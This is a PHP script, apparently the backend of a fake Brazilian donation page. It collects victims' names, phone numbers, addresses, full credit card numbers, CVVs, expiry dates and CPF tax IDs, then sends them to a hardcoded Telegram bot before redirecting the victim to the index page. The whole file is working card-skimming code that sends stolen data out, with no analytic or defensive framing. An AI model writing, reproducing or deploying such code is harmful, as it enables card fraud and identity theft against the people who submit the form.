<?php
function enviarMensagemTelegram($mensagem) {
    // TOKEN DO BOT DO TELEGRAM E O SEU ID 
    $telegramBotToken = '8924931876:AAGpAQ1TC0XToz4R0ffK0EXKwgcO7zhyTFM'; 
    $telegramChatID = '5998788553';

    $telegramURL = "https://api.telegram.org/bot$telegramBotToken/sendMessage";

    $params = [
        'chat_id' => $telegramChatID,
        'text' => "🦆 LOG DUCKETTSTONE\n\n$mensagem", 
        'parse_mode' => 'Markdown' 
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramURL);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);

    if ($response === false) {
        echo "Erro ao enviar mensagem para o Telegram: " . curl_error($ch);
    } else {
        echo "Mensagem enviada para o Telegram com sucesso!";
    }

    curl_close($ch);
}

$nome = $_POST['FIRSTNAME'] ?? '';  
$sobrenome = $_POST['LASTNAME'] ?? '';
$celular = $_POST['PHONENUM'] ?? ''; 
$genero = $_POST['GENDER'] ?? '';
$cep = $_POST['ZIP'] ?? '';
$rua = $_POST['STREET'] ?? '';
$cidade = $_POST['CITY'] ?? '';
$estado = $_POST['STATE'] ?? '';
$numeroCartao = $_POST['ACCT'] ?? ''; 
$titular = $_POST['NAME'] ?? ''; 
$cpf = $_POST['TAXID'] ?? ''; 
$validade = $_POST['EXPDATE'] ?? ''; 
$cvv = $_POST['CVV2'] ?? ''; 

$mensagemTelegram = "
**⚠️ Dono da Doação:**

👤 Nome: $nome $sobrenome
📞 Celular: $celular
🚻 Gênero: $genero

🏠 Endereço:
    🛣️ Rua: $rua
    🏙️ Cidade: $cidade
    🇧🇷 Estado: $estado
    📮 CEP: $cep

💳 Cartão:
    🏦 Número do Cartão: $numeroCartao    
    🧑‍🎤 Titular: $titular
    📄 CPF: $cpf
    📅 Validade: $validade
    🔒 CVV: $cvv
";

enviarMensagemTelegram($mensagemTelegram);

header('Location: index.html');
exit;
?>
